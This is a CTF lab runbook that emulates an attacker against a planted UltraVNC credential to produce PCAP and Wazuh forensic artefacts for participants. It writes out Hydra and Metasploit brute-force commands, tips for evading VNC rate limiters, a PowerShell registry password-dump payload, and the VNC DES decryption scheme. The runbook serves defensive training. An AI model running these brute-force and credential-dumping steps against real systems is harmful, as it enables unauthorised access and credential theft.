# Runbook: EWS VNC adversary emulation

Generate-once / replay-many procedure for the SecretCon EWS challenge.
Builds two complementary forensic artefacts for participants:

1. A staged VNC auth PCAP served from the local-lab Arkime stack.
   Participants extract the DES challenge/response bytes and recover
   `FELDTECH_VNC` offline with
   [`vncpasswd.py -d`](https://github.com/trinitronx/vncpasswd.py).
2. A "previous adversary" trail in Wazuh -- brute-force burst, registry
   audit read, and a planted exfil receipt containing the password hex
   blob -- that lets analysts recover the credential directly from
   `alerts.json` without ever touching the endpoint.

The PCAP is the entry path. The Wazuh trail is the forensic-narrative
side path. Both end in the same plaintext (`FELDTECH_VNC`), which
unlocks the existing `VNC -> patrick desktop -> unquoted service path
-> SYSTEM` kill chain unchanged.

```mermaid
flowchart LR
    Run["vnc-adversary-emulation.sh"] --> Hydra["hydra TCP/5900"]
    Run --> Tcpdump["tcpdump capture"]
    Hydra --> Login["VNC login success"]
    Login --> WinRM["WinRM PowerShell payload"]
    WinRM --> Dump["C:\\Users\\Public\\vnc-pwd-dump.txt"]
    Tcpdump --> Trim["tshark trim"]
    Trim --> ArkimePcap["arkime-docker/pcaps/vnc_auth.pcap"]
    Dump --> WazuhAgent["Wazuh agent tail"]
    WazuhAgent --> Alerts["alerts.json rules 100800-100807"]
    Alerts --> Export["wazuh-export-dataset.sh"]
    Export --> Dataset["artifacts/ews/vnc-foothold/&lt;run-id&gt;/dataset"]
    Dataset --> Replay["vnc-replay-on-deploy.sh"]
    Replay --> ProdSiem["prod Wazuh 192.168.61.10:514"]
```



## 0. Pre-requisites

| What | Where |
| --- | --- |
| Local-lab Wazuh stack up | `./scripts/wazuh-docker-up.sh` |
| Local-lab Arkime stack up | `./scripts/arkime-docker-up.sh` |
| EWS image baked and running | Hyper-V / local-QEMU / Proxmox per `infrastructure/packer/ews/` |
| WinRM reachable on EWS | TCP/5985 (or 15985 for local-QEMU forwarded) |
| Wazuh agent enrolled in `ews` group | check the dashboard, `Agents` view |
| SecLists VNC default list staged | `/usr/share/seclists/Passwords/Default-Credentials/vnc-betterdefaultpasslist.txt` (or pass `--wordlist`) |
| Tools on `PATH` | `tcpdump`, `hydra`, `tshark`, `python3` with `pywinrm`, `jq`. Use `nix develop`. |

## Kali tool and package audit matrix

Use this table when validating weak VNC credentials or auditing the test
suite. Run `python3 scripts/validate/audit-vnc-kali-tools.py` inside
`nix develop` to confirm flake/kali wiring still matches the docs.

| Tool | Package (Nix) | Shell | Command pattern | Expected on EWS | Failure means |
| --- | --- | --- | --- | --- | --- |
| `check_vnc_auth.py` | in-tree | `nix develop` | `python3 ansible/roles/ultravnc/files/check_vnc_auth.py --host IP --password FELDTECH_VNC --cred-tool scripts/observability/vnc-cred-tool.py` | **PASS** (single-probe) | Challenge misconfig or blacklist |
| `check_vnc_auth.py` | in-tree | `nix develop` | `... --wordlist provisioning/wordlists/vnc-betterdefaultpasslist.txt --delay-seconds 0.5` | **PASS** (Hydra replacement / CI sweep) | `no_vnc_auth` after 2 attempts means the in-memory pace limiter tripped — raise `--delay-seconds`. Metasploit `vnc_login` stays canonical for full sweeps. |
| `vnc-cred-tool.py` | in-tree + `cryptography` | `nix develop` | `encode` / `decode` / `crack` / `self-test` | Offline **PASS** | Crypto regression |
| `nmap` | `nmap` | `nix develop` | `nmap -Pn -p 5900 --script vnc-info TARGET` | Offers type 2 (VncAuth) | Port/filter down or SecurityType drift |
| `nmap` | `nmap` | `nix develop .#kali` | `nmap -Pn -p 5900 --script vnc-brute --script-args passdb=WORDLIST TARGET` | May **PASS** | Tool/server quirk |
| `msfconsole` | `metasploit` | `nix develop .#kali` | `use auxiliary/scanner/vnc/vnc_login` | Usually **PASS** | Module/env issue |
| `vncviewer` | `tigervnc` | `nix develop` | `vncviewer TARGET:5900` | **PASS** with planted password | Interactive only |
| `tshark` | `wireshark-cli` | `nix develop` | `tshark -r vnc_auth.pcap -Y vnc.auth_response` | PCAP offline **PASS** | Capture/trim issue |
| `tcpdump` | `tcpdump` | `nix develop` | `tcpdump -i IF port 5900 -w vnc.pcap` | Capture **PASS** | Wrong interface |
| `hydra` | `thc-hydra` | `nix develop` | `hydra -t 1 -V -f -P WORDLIST -s 5900 TARGET vnc` | Usually **PASS** when paced | Tool/server negotiation or pacing issue |

Hydra errors such as `VNC server told us to quit`, `unknown VNC server
security result -30`, or missing VncAuth after early failures usually mean the
client IP or session pace tripped a server-side limiter, not that the planted
credential is wrong. Re-run `./scripts/proxmox/converge-ews.sh` before brute
tests and keep Hydra at `-t 1`. Prefer Metasploit `vnc_login` or
`check_vnc_auth.py --wordlist` for repeatable sweeps.

### Pre-brute checklist

Run this sequence immediately before a wordlist sweep or adversary emulation:

1. **Converge** — `./scripts/proxmox/converge-ews.sh --ews-host <TARGET_IP>` (Ansible `ultravnc` role installs UltraVNC, sets `FELDTECH_VNC` via `setpasswd.exe`, and keeps `winvnc -run` on port 5900 via the `SecretCon-UltraVNC-Run` watchdog task).
2. **Registry audit** — playbook ends with `verify_state.yml` printing `ultravnc.ini` and `HKLM\SOFTWARE\ORL\WinVNC3` (forensic parity blob for Wazuh exfil).
3. **Auth banner** — `nmap -Pn -p 5900 --script vnc-info <TARGET>` (expect type 2 VncAuth among UltraVNC types).
4. **Brute tool** — Metasploit (canonical for parallel sweeps) or `check_vnc_auth.py --wordlist` (forces VncAuth type 2):

   ```
   python3 ansible/roles/ultravnc/files/check_vnc_auth.py \
     --host <TARGET> --wordlist provisioning/wordlists/vnc-betterdefaultpasslist.txt \
     --delay-seconds 0 --cred-tool scripts/observability/vnc-cred-tool.py
   ```

5. **Optional Hydra** — `hydra -t 1 -V -f -P provisioning/wordlists/vnc-betterdefaultpasslist.txt -s 5900 <TARGET> vnc`. UltraVNC advertises proprietary security types (17/117), so prefer `check_vnc_auth.py --wordlist` or Metasploit for reliable sweeps if Hydra cannot negotiate the expected VncAuth path.

Hot-test registry deltas without Ansible: `TARGET=<ip> ./scripts/observability/vnc-hot-test-registry-fix.sh all` (requires SSH as `Administrator`).

### Two distinct rate limiters: registry blacklist vs. in-memory pace limiter

VNC server throttling shows up two different ways. They produce different
symptoms and need different fixes — do not conflate them.

| Mechanism | Where it lives | Symptom | Mitigation |
| --- | --- | --- | --- |
| Per-IP blacklist (`BlacklistThreshold` / dotted-quad DWORDs) | Registry, persists across restarts | `SecurityResult -30` (`0xFFFFFFE2`); `check_vnc_auth.py` reports `blacklisted`; Hydra/msf "blacklist"/"told us to quit" errors | Converge (clears per-IP keys, sets `BlacklistThreshold` > 41-entry wordlist; `ews-prod` uses `10000`). Persists until cleared. |
| In-memory pace limiter | VNC service process RAM, drains over time | Server stops offering VncAuth (type 2) on fast back-to-back tries → `check_vnc_auth.py` reports `no_vnc_auth`; msf reports *No authentication types available: Your connection has been rejected* | **Pace the attempts.** It is timing-sensitive, **not** threshold-sensitive — raising `BlacklistThreshold` does **not** help. |

Key consequence: a raised `BlacklistThreshold` only defeats the *registry*
blacklist. The in-memory limiter is defeated purely by **slowing down**:

- **Metasploit** — `set BRUTEFORCE_SPEED 0` (confirmed canonical). `BRUTEFORCE_SPEED 5`
  fires attempts too quickly and trips the in-memory limiter: every attempt
  after the first wrong guess returns *No authentication types available*, even
  with `BlacklistThreshold=0x2710`. Treat `BRUTEFORCE_SPEED 5` as a documented
  **negative control**, not a usable setting on EWS.
- **`check_vnc_auth.py --wordlist`** — paced by default (`--delay-seconds 0.5`)
  and retries the same candidate with backoff on a transient `no_vnc_auth` /
  `blacklisted` / `connection_refused` before moving on. If a sweep still aborts
  with `last_outcome=no_vnc_auth`, raise `--delay-seconds` (e.g. `1.0`).
- **Hydra** — `-t 1` only. Parallel tasks (`-t > 1`) trip the in-memory limiter
  regardless of `BlacklistThreshold`.

## Live lab validation (Proxmox)

| VM | VMID | Role | Typical address |
| --- | --- | --- | --- |
| EWS (target) | 109 | UltraVNC foothold + unquoted path | `192.168.60.109` (vmbr0) or `192.168.61.20` (vmbr1 campaign) |
| Kali (attacker) | 104 | Run `verify-ews.sh`, hydra, nmap, msf | vmbr0 management |
| OPNsense (mirror) | 100 | SPAN / Suricata NSM path | `192.168.61.253` |
| crit-capture (Arkime) | 111 | PCAP indexing | `192.168.61.11` |

Workflow:

1. Converge EWS: `./scripts/proxmox/converge-ews.sh` (Ansible `ews.yml` + `ultravnc` role).
2. From Kali or `nix develop`: `./scripts/verify-ews.sh <ews-ip>`.
3. Optional full trail: `./scripts/observability/vnc-public-attack.sh --target <ews-ip>`.
4. Optional NSM: `./scripts/observability/opnsense-vnc-challenge.sh --validate` (requires mirror + VM 100/111).

Hostname notes: inventory host is `ews-prod`; Windows `ComputerName` is
`WIN10-EWS`; Proxmox VM name is `secretcon-ews-vnc-unquoted-path`. Aliases
like `tvserver` or `dash-1` are not in git — override with
`-e ansible_host=<ip>` when converging.

## 1. Generate the artefacts (one shot)

Pick the run-id you want stamped on artefacts so downstream consumers
can reference it explicitly:

```
./scripts/observability/vnc-adversary-emulation.sh \
    --target 127.0.0.1 \
    --vnc-port 15900 \
    --winrm-port 15985 \
    --run-id ews-vnc-$(date -u +%Y%m%dT%H%M%SZ)
```

For the Proxmox lab path (EWS at `192.168.61.20`, capture from the
operator workstation routed via the WireGuard tunnel):

```
./scripts/observability/vnc-adversary-emulation.sh \
    --target 192.168.61.20 \
    --vnc-port 5900 \
    --winrm-port 5985 \
    --admin-pass "$ADMIN_PW" \
    --capture-iface wg-ctf
```

What it does, in order:

1. Starts `tcpdump` writing `vnc-attack-raw.pcap` on the chosen
   capture interface, scoped to `tcp port <vnc-port>`.
2. Runs `hydra` against TCP/5900 with the SecLists default-VNC list.
   The planted `FELDTECH_VNC` entry resolves the brute force; the Ansible
   `ultravnc` role keeps the listener on TCP/5900 and clears stale legacy
   TightVNC state on converge. Use `hydra -t 1`; parallel tasks still risk
   pacing failures.
3. Opens a WinRM session as `Administrator` and runs the canonical
   PowerShell exfil payload:

   ```powershell
   $bytes = (Get-ItemProperty -Path "HKLM:\SOFTWARE\ORL\WinVNC3" -Name Password).Password
   $hex = [BitConverter]::ToString($bytes)
   $line = "[$ts] VNC password blob (hex): $hex (source=HKLM:\SOFTWARE\ORL\WinVNC3, host=$env:COMPUTERNAME, user=$env:USERNAME)"
   Add-Content -LiteralPath C:\Users\Public\vnc-pwd-dump.txt -Value $line
   ```

   This produces both the Sysmon EID 11 file-create event (rule
   `100804`) and the receipt-file line that Wazuh's syslog tail picks
   up as `full_log` (rule `100806`). The registry SACL applied during
   bootstrap means the underlying registry read also fires Security
   EID 4663 (rule `100805`).
4. Stops `tcpdump`, trims the raw capture to RFB-only frames with
   `tshark -Y "vnc || rfb || tcp.port == <vnc-port>"`, and stages the
   trimmed PCAP into `infrastructure/arkime-docker/pcaps/vnc_auth.pcap`.
   If the Arkime stack is up, `arkime-import-pcap.sh` ingests it
   immediately with tags `ews-vnc-foothold` and `<run-id>`.
5. Exports the Wazuh dataset via
   [`scripts/wazuh-export-dataset.sh`](../../scripts/wazuh-export-dataset.sh)
   into `artifacts/ews/vnc-foothold/<run-id>/dataset/`.

Final layout:

```
artifacts/ews/vnc-foothold/<run-id>/
    run.log
    summary.json
    vnc-attack-raw.pcap      # full capture
    vnc_auth.pcap            # trimmed (also staged in arkime-docker/pcaps/)
    hydra.log
    winrm-payload.log
    dataset/                 # produced by wazuh-export-dataset.sh
      alerts/alerts.json
      archives/archives.json
      manager/local_rules.xml
      agent/agent.conf
      ...
```

## 2. Verify the trail

Wazuh dashboard at https://127.0.0.1:1443 (default creds: `admin` /
`SecretPassword`). Filter by `rule.id` to confirm the chain fired:

| Rule ID | Description | Expected count per run |
| --- | --- | --- |
| `100800` | VNC connection burst | 1 (after >=10 connects in 60s) |
| `100801` | legacy `tvnserver.log` auth failure | ~30-40 (one per wrong pw, legacy path only) |
| `100802` | `reg.exe query ... ORL\WinVNC3` or legacy `TightVNC\Server` | 0 (we use PowerShell, not reg.exe; fires if a participant runs reg query) |
| `100803` | VNC password registry value SET | 0 on a stable image (1 at bake/configure time) |
| `100804` | `vnc-pwd-dump.txt` file create | 1 |
| `100805` | Security EID 4663 on VNC password key | 1+ (SACL audit hit) |
| `100806` | hex blob exfil receipt (full_log) | 1 |
| `100807` | velocity correlation | 1 |

Recover the credential from the SIEM (no endpoint access needed):

```
docker exec wazuh.manager \
    grep '"rule":{"level":12.*100806' \
    /var/ossec/logs/alerts/alerts.json \
    | jq -r '.full_log'
# -> "VNC password blob (hex): XX-XX-XX-XX-XX-XX-XX-XX (...)"

# Strip whitespace + dashes, feed to vncpasswd.py
HEX=$(... extract above ...)
vncpasswd.py -d -H "$(echo "$HEX" | tr -d '-')"
# -> FELDTECH_VNC
```

In Arkime (http://127.0.0.1:8005, default `admin` / `SecretCon123!`):

- Search `port == 5900` -- you should see one session tagged
  `ews-vnc-foothold` per run.
- Open the session's SPI view; under the RFB pane you can read the
  16-byte challenge and 16-byte response. `vncpasswd.py -d -C <chal>
  -R <resp>` recovers the same plaintext.

## 3. Replay the trail on every deploy

The dataset is a portable artefact. On every fresh EWS deploy (or
production SIEM reset), inject it into the target manager so the
forensic narrative is in place *before* participants connect:

```
./scripts/observability/vnc-replay-on-deploy.sh \
    --target 192.168.61.10:514
```

With no flags, the script picks the most recent dataset under
`artifacts/ews/vnc-foothold/<run-id>/dataset/` and replays it via
[`scripts/wazuh-replay-to-proxmox.sh`](../../scripts/wazuh-replay-to-proxmox.sh)
at 50 EPS. Each event is wrapped in a structured-data tag of the form
`[SECRETCON-REPLAY tag=ews-vnc:<run-id> orig_ts=...]` so the receiving
analyst can tell replayed events apart from live ones.

The Arkime PCAP is already on disk (`infrastructure/arkime-docker/pcaps/vnc_auth.pcap`);
re-running `./scripts/arkime-docker-up.sh` after a wipe re-imports it
automatically.

## 4. Flag placement (unchanged)

The new artefacts add *paths to recover the credential*; they do not
relocate the flags. Both flags stay where
[`targets/ews-win11/flag-notes.md`](../../targets/ews-win11/flag-notes.md)
puts them:

- User flag (`crit-low-priv-patrick`) -- `C:\Users\patrick\Desktop\flag.txt`
- Root flag (`crit-root-system-privs`) -- `C:\Users\Administrator\Desktop\root.txt`

## 5. Regenerating after a VNC password rotation

If the planted credential is ever rotated, regenerate everything:

```
# 1. Re-bake EWS so the new VALUE_OF_PASSWORD lands in the registry.
# 2. Re-run the emulation (writes a new vnc-pwd-dump.txt with the new
#    hex bytes; produces a new PCAP for the new password).
./scripts/observability/vnc-adversary-emulation.sh --run-id ews-vnc-$(date -u +%Y%m%dT%H%M%SZ)
# 3. (optional) prune older datasets under artifacts/ews/vnc-foothold/
# 4. Re-replay the new dataset into the prod SIEM.
./scripts/observability/vnc-replay-on-deploy.sh
```

## 6. Common pitfalls

- **Hydra / msf reports `unknown VNC server security result -30` on every attempt.**
  The client is blacklisted or paced out. On current UltraVNC images, re-run
  `./scripts/proxmox/converge-ews.sh --ews-host <IP>` to clear stale VNC state
  and reapply `HKLM\SOFTWARE\ORL\WinVNC3`; use `hydra -t 1` or Metasploit
  `BRUTEFORCE_SPEED 0` for the next sweep.
- **nmap vnc-info shows type 16 (Tight) instead of type 2.** `SecurityType` /
  `PreferAuth` did not persist; re-run converge and check `verify_state` assertions.
- **Arkime viewer empty / no sessions.** The viewer is up but the PCAP
  was never imported -- run `./scripts/arkime-import-pcap.sh
  infrastructure/arkime-docker/pcaps/vnc_auth.pcap --force` to ingest.
- **tcpdump permission denied.** On NixOS, run inside `nix develop`
  (capability-wrapped tcpdump) or prefix with `sudo`.
- **hydra returns "0 valid passwords".** Wordlist is missing the planted
  credential. Confirm `FELDTECH_VNC` appears in the file:
  `grep -i FELDTECH_VNC "$WORDLIST"`. The script's default path is
  the SecLists "better default" list which contains it.
- **EID 4663 missing despite SACL.** The Audit Registry subcategory
  might have been reset by Group Policy. Re-run the relevant block of
  [`provisioning/powershell/bootstrap_win.ps1`](../../provisioning/powershell/bootstrap_win.ps1)
  (the `auditpol` + `Set-Acl` lines) by hand on the box.
- **Rule 100807 never fires.** Velocity correlation requires
  `100800` *and* one of `100802 / 100804 / 100805` within 15 minutes
  on the manager clock. Check that the manager and agent clocks are
  in sync (`docker exec wazuh.manager date`, then compare to the EWS).

## 7. Cryptographic proof (no EWS required)

The full live emulation needs an EWS image baked and online. For a fast,
self-contained sanity check that the planted `FELDTECH_VNC` credential
is genuinely recoverable from the artefacts we ship, we have two proof
orchestrators that exercise the math directly. Both use the same
pure-Python TightVNC DES reference implementation in
[`scripts/observability/vnc-cred-tool.py`](../../scripts/observability/vnc-cred-tool.py),
so the algorithm is exercised from two independent angles.

### 7.1. The cred tool

```bash
nix develop
python3 scripts/observability/vnc-cred-tool.py self-test
# ... prints: blob 52-E6-65-4C-7A-A1-88-5F; response C2-88-...; recovers FELDTECH_VNC.
```

Subcommands:

| Subcommand | What it does |
| --- | --- |
| `encode --password PWD` | password &rarr; 8-byte stored blob (`HKLM\SOFTWARE\ORL\WinVNC3\Password` on current UltraVNC images; legacy TightVNC used `HKLM\SOFTWARE\TightVNC\Server\Password`). Implements RealVNC's `DES_ECB(bit_reverse(pad8(pwd)), {0x17,0x52,0x6B,0x06,0x23,0x4E,0x58,0x07})`. |
| `decode --hex BLOB --wordlist PATH` | dictionary attack against a stored blob (re-encodes each candidate). |
| `crack --challenge HEX --response HEX --wordlist PATH` | dictionary attack against an RFB-3.x auth handshake. Same key, plaintext = the server's 16-byte challenge split into two DES blocks. |
| `synth-pcap --password PWD --challenge HEX --output PATH` | scapy-built RFB-3.8 auth handshake PCAP from `192.0.2.10:53234 -> 192.0.2.20:5900`. Dissectable by tshark out of the box. |
| `synth-wazuh-event --password PWD ... --output PATH` | JSON-line event in the alerts.json shape; `full_log` carries the exact "VNC password blob (hex):" line that rule `100806` matches on. |

The math:

- **DES key**: NUL-pad password to 8 bytes, then bit-reverse each byte. (RealVNC's historical workaround for export controls.)
- **Stored blob**: `DES_ECB_encrypt(key, {0x17,0x52,0x6B,0x06,0x23,0x4E,0x58,0x07})`. Plaintext is known &rarr; recovery is dictionary attack on the key.
- **Auth response**: `DES_ECB(key, challenge[0:8]) || DES_ECB(key, challenge[8:16])`. Same dictionary attack.

### 7.2. Wazuh proof

```bash
./scripts/observability/vnc-wazuh-proof.sh
```

This:

1. Synthesises the canonical exfil-receipt line via `vnc-cred-tool synth-wazuh-event` — embedding the real, byte-accurate hex blob for `FELDTECH_VNC`.
2. Pipes that single line into `wazuh-logtest` inside the running `wazuh.manager` container with `-l 'C:\Users\Public\vnc-pwd-dump.txt'` to match rule `100806`'s location pattern.
3. Captures the full decoder-trace + rule-trace output, asserts that rule `100806` matched at level 12 with MITRE `T1005, T1552.002`.
4. Distils the matched phase-3 block into a structured JSON `alert.json`.
5. Extracts the hex blob via regex and round-trips it through `vnc-cred-tool decode` against the SecLists wordlist &rarr; must produce `FELDTECH_VNC`.

`wazuh-logtest` exercises the manager's full decoder + rule chain, so a match here proves the rule fires on the planted line. Landing an actual `alerts.json` entry requires a real Windows agent reporting `location=C:\Users\Public\vnc-pwd-dump.txt` — rule `100806`'s `<location>` constraint is Windows-path specific by design (so it doesn't fire on Linux-side log noise). That's the contract the live EWS chain exercises; this proof exercises the rule independently of the EWS bake.

Artefacts: `artifacts/ews/proof/ews-vnc-proof-<TS>/`:

- `event.json` — the synth Wazuh event (alerts.json shape).
- `full_log.txt` — the planted line that fired rule `100806`.
- `logtest.txt` — raw wazuh-logtest trace including the matched rule, level, description, groups, MITRE IDs.
- `alert.json` — distilled JSON snapshot of the matched alert.
- `recovered.txt` — the plaintext password recovered from the hex blob (must be `FELDTECH_VNC`).

### 7.3. PCAP proof

```bash
./scripts/observability/vnc-pcap-proof.sh                  # tshark + crack
./scripts/observability/vnc-pcap-proof.sh --arkime         # also import into running Arkime
```

This:

1. Builds a real RFB-3.8 auth handshake PCAP with `vnc-cred-tool synth-pcap` — full TCP three-way handshake, protocol-version exchange, security-type negotiation (VNC auth = 2), the 16-byte challenge, the FELDTECH_VNC-derived response, and the `SecurityResult: 0` (OK) record.
2. Dissects the PCAP with `tshark -d tcp.port==5900,vnc -O vnc -V` so the RFB dissector engages. Captures the full verbose dissection.
3. Extracts `vnc.auth_challenge` and `vnc.auth_response` independently with `tshark -T fields`.
4. Feeds the extracted pair into `vnc-cred-tool crack` against the SecLists wordlist &rarr; must produce `FELDTECH_VNC`.
5. Copies the PCAP into `infrastructure/arkime-docker/pcaps/` so subsequent `./scripts/arkime-docker-up.sh` runs auto-import it. With `--arkime`, brings the stack up immediately and asserts a session count > 0 for `port==5900`.

Artefacts: `artifacts/ews/proof/ews-vnc-pcap-<TS>/`:

- `vnc_auth.pcap` — the synthesised handshake.
- `tshark-summary.txt` — full RFB dissection output.
- `tshark-fields.txt` — extracted challenge + response (hex, no dashes).
- `recovered.txt` — the plaintext password recovered from the captured pair (must be `FELDTECH_VNC`).
- `arkime-session-count.json` — only present if `--arkime` was passed and the stack came up.

### 7.4. Production reproduction (Proxmox lab over WireGuard)

The proofs above run end-to-end in the local sandbox. Section **8** below is the production analogue: it reproduces both proofs against the live Proxmox lab (Wazuh manager VMID 110 + EWS VMID 109 + a fresh Arkime VMID 111) and ships a self-describing evidence pack under `artifacts/ews/prod-proof-<RUN_ID>/`.

### 7.5. Re-running after credential rotation

Both proofs derive everything from the password argument. To re-prove after rotating `FELDTECH_VNC` to `NEW_VNC_PW`:

```bash
PASSWORD=NEW_VNC_PW ./scripts/observability/vnc-wazuh-proof.sh
PASSWORD=NEW_VNC_PW ./scripts/observability/vnc-pcap-proof.sh
```

Make sure the new credential is also added to `provisioning/wordlists/vnc-betterdefaultpasslist.txt` (otherwise the dictionary attack step naturally fails and the round-trip aborts).

## 8. Production reproduction

Reproduce both FELDTECH_VNC paths against the live Proxmox lab from the operator workstation (`192.168.2.12`) over the `wg-ctf` WireGuard tunnel. The orchestrator chains every step from the local proof, swapping the docker stack for the live Wazuh manager and a freshly-deployed Arkime VM.

### 8.1. One-shot driver

```bash
nix develop --command bash -c '
  ./scripts/proxmox/reproduce-ews-prod-proof.sh \
      --run-id ews-prod-$(date -u +%Y%m%dT%H%M%SZ)
'
```

The orchestrator does the following in order, writing every artefact into one `artifacts/ews/prod-proof-<RUN_ID>/` directory:

1. **preflight** — confirms `wg-ctf` is up, every dependency from `nix develop` is on `PATH`, `.env` has `PROXMOX_PASSWORD` + `WAZUH_API_PASSWORD`, the Proxmox host + Wazuh manager are pingable, and the Wazuh API + agent + dashboard ports are open.
2. **probe-ews** — re-runs [`scripts/verify-ews.sh`](../../scripts/verify-ews.sh) plus a Wazuh-API agent-state check and an SSH-into-EWS check that the VNC registry audit path is still in effect.
3. **conditional rebuild** — only when probe-ews exited non-zero (or `--rebuild` was passed): runs `packer build -only proxmox-iso.win10-ews`, then `qm set --net0 bridge=vmbr1` + `qm reboot 109`, then re-runs `verify-ews.sh`.
4. **sync-wazuh-rules** — pushes `infrastructure/wazuh-docker/config/wazuh_cluster/local_rules.xml` (`100501-100807`) + `shared/ews/agent.conf` to the production manager. Always runs.
5. **logtest smoke test** — feeds a synthetic VNC password blob into `wazuh-logtest -l 'C:\Users\Public\vnc-pwd-dump.txt'` on the production manager and asserts rule `100806` fires. Aborts before any destructive step if the rule did not load.
6. *(optional, `--enable-replay`)* — appends the `:514 tcp syslog` `<remote>` block to the production manager's `ossec.conf` so the replay path can ingest pre-recorded datasets. Idempotent.
7. **deploy/verify Arkime** — runs `verify-arkime-capture.sh` first; if it fails (typically because VMID 111 doesn't exist yet) it clones template 9000 → 111, sets cloud-init, lets cloud-init install Docker, then scp's `infrastructure/arkime-docker/` + `provisioning/cloud-init/arkime/bootstrap.sh` and runs the bootstrap inside the VM. The bootstrap brings the compose stack up with a `docker-compose.override.yml` that binds the viewer on `0.0.0.0:8005`, runs `db.pl init`, and creates the admin user.
8. **live adversary emulation** — `scripts/observability/vnc-adversary-emulation.sh` against `192.168.61.20:5900` over the WireGuard tunnel: tcpdump on `--capture-iface wg-ctf`, hydra brute-force against the planted FELDTECH_VNC, WinRM PowerShell payload that reads `HKLM:\SOFTWARE\ORL\WinVNC3\Password` (falling back to legacy TightVNC) and writes the hex blob to `C:\Users\Public\vnc-pwd-dump.txt`, then a pull of the production manager's `alerts.json` via `scripts/wazuh-export-dataset.sh --manager-ssh`.
9. **Wazuh path verification** — jq-filters the captured `alerts.json` to rule `100806`, extracts the 8-byte hex blob from `full_log`, decodes it with `vnc-cred-tool decode` against the SecLists wordlist, asserts the result equals `FELDTECH_VNC`.
10. **Arkime path verification** — `scripts/proxmox/sync-arkime-pcap.sh` copies the trimmed `vnc_auth.pcap` to `192.168.61.11:/opt/arkime-docker/pcaps/` and runs `docker exec arkime.viewer /opt/arkime/bin/capture` to import it. Then asserts the session count > 0 for `destination.port:5900`, extracts the (challenge, response) pair with `tshark -T fields`, and runs `vnc-cred-tool crack` to recover the password.
11. *(optional, `--enable-replay`)* — replays the captured dataset to `${WAZUH_MANAGER_HOST}:514` via `scripts/observability/vnc-replay-on-deploy.sh`.
12. **summary** — emits `summary.json` (machine-readable) + `INDEX.md` (human-readable) listing every step result and artefact size.

### 8.2. Useful flags

| Flag | Effect |
| --- | --- |
| `--rebuild` | Force a Packer rebuild of VMID 109 even if probe-ews passed. |
| `--skip-rebuild` | Never rebuild, even on drift (use for "I just want to verify the rest"). |
| `--skip-arkime` | Don't deploy/redeploy VMID 111; assume it exists. |
| `--redeploy-arkime` | Force a clean redeploy of VMID 111. |
| `--enable-replay` | Configure `:514` on the manager and exercise the replay path. |
| `--no-emulation` | Skip the destructive hydra+WinRM step (still verifies the existing dataset). |
| `--target-ews IP` | Override EWS IP (default `192.168.61.20`). |
| `--capture-iface IF` | Override tcpdump interface (default `wg-ctf`). |

### 8.3. Expected evidence pack

`artifacts/ews/prod-proof-<RUN_ID>/`:

- `preflight.txt` — connectivity + dep checklist.
- `ews-probe.txt` — drift report with `OVERALL: DRIFT_FREE` or `DRIFTED`.
- `rebuild-ews.log` (only when rebuild ran).
- `sync-wazuh-rules.log` — full output of the rule push.
- `prod-wazuh-logtest.txt` — definitive proof rule `100806` is loaded on the production manager.
- `enable-replay-listener.log` (only when `--enable-replay`).
- `deploy-arkime-summary.txt` (only when deploy-arkime ran).
- `verify-arkime.txt` — viewer + OpenSearch health + `arkime_files` index check.
- `vnc_auth.pcap` — real RFB handshake from the live attack (auto-mirrored from the emulation output dir).
- `dataset/alerts/alerts.json` — pulled from the production manager.
- `prod-wazuh-alert.json` — jq-filtered to rule `100806`.
- `recovered-from-wazuh.txt` — must contain `FELDTECH_VNC`.
- `prod-arkime-session-count.json` + `prod-arkime-session.json` — count and first-row dump from the production Arkime index after PCAP import.
- `prod-tshark-fields.txt` — `vnc.auth_challenge` + `vnc.auth_response` extracted from the PCAP.
- `recovered-from-pcap.txt` — must contain `FELDTECH_VNC`.
- `replay-on-deploy.log` (only when `--enable-replay`).
- `summary.json` + `INDEX.md` — index of step results and artefacts.

### 8.4. Recovery checklist

- Preflight FAILs on `wg-iface-up`: bring up the WireGuard tunnel on the operator workstation first (`sudo wg-quick up wg-ctf` or `wg show`).
- Preflight FAILs on `dep-*`: re-run inside `nix develop` so `hydra`, `tshark`, `tcpdump`, `sshpass`, `vncpasswd` are on PATH.
- Probe FAILs on `verify-ews`: the orchestrator will rebuild automatically. Pass `--skip-rebuild` only if you want to investigate first.
- `wazuh-logtest` did not match rule `100806`: re-run `scripts/proxmox/sync-wazuh-rules.sh` manually and tail `/var/ossec/logs/ossec.log` on `192.168.61.10` for parse errors.
- `verify-arkime` FAILs on `arkime-files-index`: the first-run `db.pl init` step inside the in-guest bootstrap mirrors the local-lab fix from `scripts/arkime-docker-up.sh:43-58`. Re-run `provisioning/cloud-init/arkime/bootstrap.sh` inside the VM if the index is still missing.
- `recovered-from-pcap.txt` is wrong: confirm `tshark` decoded port 5900 as VNC (`prod-tshark-fields.txt` should be non-empty). The PCAP must have been captured during the live hydra phase — re-run `--no-emulation` does NOT regenerate the PCAP.

### 8.5. Cost / time profile

- Preflight + probe + sync-rules + verify-arkime (idempotent path):  ~2 min.
- Full first-run with EWS rebuild + Arkime deploy:  ~45-60 min (Packer build dominates).
- Steady-state re-run (no rebuild, Arkime already healthy):  ~5-7 min.

## Troubleshooting: Wazuh rule 100801 silent (tvnserver.log)

If VNC brute-force runs but rules `100800`/`100801` never fire, check two
known layers (full incident write-up archived in
[`docs/notes/vnc-tvnserver-log-share-violation-2026-05-26.md`](../notes/vnc-tvnserver-log-share-violation-2026-05-26.md)):

1. **Log file never created (Layer 1 — fixed in bootstrap):** TightVNC only
   honors logging when `SET_LOGLEVEL` and `SET_SAVELOGTOALLUSERSPATH` arrive
   via MSI properties at install time. Post-install registry writes to
   `LogLevel`/`LogDir` are silently ignored. Ensure
   `provisioning/powershell/bootstrap_win.ps1` passes all four MSI logging
   properties, then rebake or converge with Ansible `tightvnc` role.

2. **Log file exists but agent cannot tail (Layer 2 — open):** TightVNC opens
   `tvnserver.log` with an exclusive share lock. The Wazuh logcollector may
   register the path in `ossec.log` but fail to read content. Symptom:
   `(1950): Analyzing file:` appears once, no lines in `archives.json`, rule
   `100801` stays silent. Workarounds under investigation: copy-on-read helper,
   alternate tail path, or TightVNC log rotation config. Sysmon rule `100800`
   (network connect to port 5900) remains the reliable brute-force signal.

Quick on-box test while the service is running:

```powershell
try {
  $fs = [System.IO.File]::Open(
    "C:\ProgramData\TightVNC\tvnserver.log",
    [System.IO.FileMode]::Open,
    [System.IO.FileAccess]::Read,
    [System.IO.FileShare]::Read
  )
  "OPEN OK"; $fs.Close()
} catch {
  "OPEN FAIL: $($_.Exception.Message)"
}
```

## References

